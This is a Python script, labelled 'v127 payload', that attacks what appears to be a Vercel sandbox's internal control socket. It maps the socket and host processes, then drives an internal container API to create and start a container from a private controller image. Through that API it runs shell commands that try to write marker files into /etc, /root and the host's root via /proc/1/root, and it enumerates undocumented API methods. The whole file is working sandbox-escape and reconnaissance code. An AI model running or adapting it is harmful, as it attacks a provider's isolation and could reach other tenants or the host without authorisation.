# -*- coding: utf-8 -*-
"""v127 payload: /run/cell/cell.sock 决定性验证
A 侦察: socket 归属/监听者/mountinfo/PID1
B 直连: List/Create/Start/Exec 多位置 marker + StreamOutput 拿输出
C 方法枚举: ContainersService/ProcessService 未知方法
D marker 落点检查 -> 判定 Exec 执行环境 (guest/其他容器/host)
输出 /vercel/sandbox/v127.out"""
import socket, struct, time, json, os, signal

OUT = '/vercel/sandbox/v127.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(260)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


# ---------------- A: recon ----------------
log('=== A recon ===')
for p in ['/run/cell', '/run/cell/cell.sock', '/run/cell']:
    try:
        st = os.stat(p)
        log('stat %s: mode=%o uid=%d gid=%d' % (p, st.st_mode, st.st_uid, st.st_gid))
    except Exception as e:
        log('stat %s EXC %s' % (p, e))
try:
    log('ls /run/cell: %s' % os.listdir('/run/cell'))
except Exception as e:
    log('ls /run/cell EXC %s' % e)
try:
    for ln in open('/proc/self/mountinfo', errors='replace'):
        if 'cell' in ln or '/run ' in ln or ' /run ' in ln:
            log('mi: %s' % ln.strip()[:220])
except Exception as e:
    log('mountinfo EXC %s' % e)
try:
    import subprocess
    r = subprocess.run(['ss', '-xlpn'], capture_output=True, timeout=5)
    for ln in (r.stdout or b'').decode(errors='replace').splitlines():
        if 'cell' in ln:
            log('ss: %s' % ln.strip())
except Exception as e:
    log('ss EXC %s' % e)
try:
    log('pid1 cmdline: %r' % open('/proc/1/cmdline', 'rb').read()[:300])
    log('pid1 comm: %r' % open('/proc/1/comm', 'r').read())
except Exception as e:
    log('pid1 EXC %s' % e)
try:
    for d in os.listdir('/proc'):
        if not d.isdigit():
            continue
        try:
            comm = open('/proc/%s/comm' % d).read().strip()
            if 'cell' in comm or 'sandbox' in comm or 'init' in comm or 'vercel' in comm:
                log('proc %s comm=%s' % (d, comm))
        except Exception:
            pass
except Exception as e:
    log('proc scan EXC %s' % e)

CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PROC = '/vercel.hive.cell.api.processes.v1.ProcessService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'


def connect_unix(sockpath, path, body, t=5.0, ctype='application/json'):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, ctype, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        return status, d[hdr_end + 4:hdr_end + 4 + 800] if hdr_end > 0 else b''
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


def dechunk(d):
    out = b''
    off = 0
    while off < len(d):
        i = d.find(b'\r\n', off)
        if i < 0:
            break
        try:
            ln = int(d[off:i].split(b';')[0], 16)
        except Exception:
            break
        if ln == 0:
            break
        out += d[i + 2:i + 2 + ln]
        off = i + 2 + ln + 2
    return out


def stream_data(sockpath, path, payload, ctype, t=15.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        env1 = b'\x00' + struct.pack('>I', len(payload)) + payload
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\n\r\n'
               % (path, ctype, len(env1))).encode() + env1
        s.sendall(req)
        s.shutdown(socket.SHUT_WR)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        body = d[hdr_end + 4:] if hdr_end > 0 else b''
        body = dechunk(body)
        return status, body
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


# ---------------- B: connect ----------------
log('=== B connect cell.sock ===')
st, pay = connect_unix(CELL, '%s/List' % CTRS, b'{}', t=3)
log('List -> %s %r' % (st, pay[:400]))

st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=10)
log('Create -> %s %r' % (st, pay[:500]))
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('cid=%s' % cid)

if cid:
    st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
    log('Start -> %s %r' % (st, pay[:300]))

    CMD = ("echo ===EXEC_BEGIN===; id; hostname; pwd; "
           "cat /proc/1/cmdline 2>&1 | head -c 300; echo; "
           "echo CELLM1 > /tmp/cellm1.txt; echo CELLM2 > /var/tmp/cellm2.txt; "
           "echo CELLM3 > /etc/cellm3.txt 2>&1; echo CELLM4 > /opt/cellm4.txt 2>&1; "
           "echo CELLM5 > /vercel/cellm5.txt 2>&1; echo CELLM6 > /root/cellm6.txt 2>&1; "
           "echo CELLM7 > /proc/1/root/tmp/cellm7.txt 2>&1; "
           "ls / 2>&1 | head -30; ls /proc/1/root/ 2>&1 | head -20; "
           "cat /proc/1/cgroup 2>&1; cat /proc/self/cgroup 2>&1; "
           "echo ===EXEC_END===; sleep 120")
    st, pay = connect_unix(CELL, '%s/Exec' % CTRS,
                           json.dumps({'containerId': cid, 'process': {'args': ['/bin/sh', '-c', CMD]}}).encode(), t=5)
    log('Exec -> %s %r' % (st, pay[:300]))
    pid = None
    try:
        pid = json.loads(pay.decode()).get('processId')
    except Exception:
        pass
    log('processId=%s' % pid)

    # StreamOutput 变体
    if pid:
        variants = [
            ('stdout-field', {'processId': pid, 'stream': 'stdout'}),
            ('stderr-field', {'processId': pid, 'stream': 'stderr'}),
            ('STDOUT', {'processId': pid, 'stream': 'STDOUT'}),
            ('num0', {'processId': pid, 'stream': 0}),
            ('plain', {'processId': pid}),
        ]
        for name, v in variants:
            st, out = stream_data(CELL, '%s/StreamOutput' % PROC, json.dumps(v).encode(), 'application/connect+json', t=8)
            txt = ''.join(chr(b) for b in out if 32 <= b < 127 or b in (10, 13))
            log('SO[%s] %s out=%r' % (name, st, txt[:400]))
        # proto 变体: field1=pid(2) field2=stream enum(0=stdout?)
        for st_enum in (0, 1, 2):
            preq = b'\x0a' + bytes([len(pid)]) + pid.encode() + b'\x10' + bytes([st_enum])
            st, out = stream_data(CELL, '%s/StreamOutput' % PROC, preq, 'application/connect+proto', t=8)
            txt = ''.join(chr(b) for b in out if 32 <= b < 127 or b in (10, 13))
            log('SO[proto%d] %s out=%r' % (st_enum, st, txt[:400]))
        st, pay = connect_unix(CELL, '%s/Wait' % PROC, json.dumps({'processId': pid}).encode(), t=10)
        log('Wait -> %s %r' % (st, pay[:300]))
        st, pay = connect_unix(CELL, '%s/Kill' % PROC, json.dumps({'processId': pid}).encode(), t=3)
        log('ProcKill -> %s %r' % (st, pay[:300]))

# ---------------- C: method enum ----------------
log('=== C method enum ===')
ctrs_methods = ['Get', 'GetContainer', 'Inspect', 'Delete', 'Remove', 'List', 'Stop',
                'Pause', 'Resume', 'Restart', 'Mount', 'Attach', 'Logs', 'Stats',
                'Update', 'Patch', 'Exec', 'Kill', 'Wait', 'PortForward', 'Copy', 'Snapshot']
proc_methods = ['Get', 'List', 'Kill', 'Wait', 'StreamOutput', 'Start', 'Stop',
                'Attach', 'Resize', 'Signal', 'Pty', 'StreamInput']
for m in ctrs_methods:
    st, pay = connect_unix(CELL, '%s/%s' % (CTRS, m), b'{}', t=3)
    log('CTRS/%s -> %s %r' % (m, st, pay[:180]))
for m in proc_methods:
    st, pay = connect_unix(CELL, '%s/%s' % (PROC, m), b'{}', t=3)
    log('PROC/%s -> %s %r' % (m, st, pay[:180]))

# ---------------- D: marker check ----------------
log('=== D marker check ===')
if cid:
    time.sleep(3)
    for p in ['/tmp/cellm1.txt', '/var/tmp/cellm2.txt', '/etc/cellm3.txt', '/opt/cellm4.txt',
              '/vercel/cellm5.txt', '/root/cellm6.txt', '/proc/1/root/tmp/cellm7.txt']:
        try:
            log('M %s: %r' % (p, open(p).read().strip()))
        except Exception as e:
            log('M %s EXC %s' % (p, e))
    st, pay = connect_unix(CELL, '%s/Delete' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
    log('Cleanup Delete -> %s %r' % (st, pay[:200]))

log('V127_DONE')
f.close()
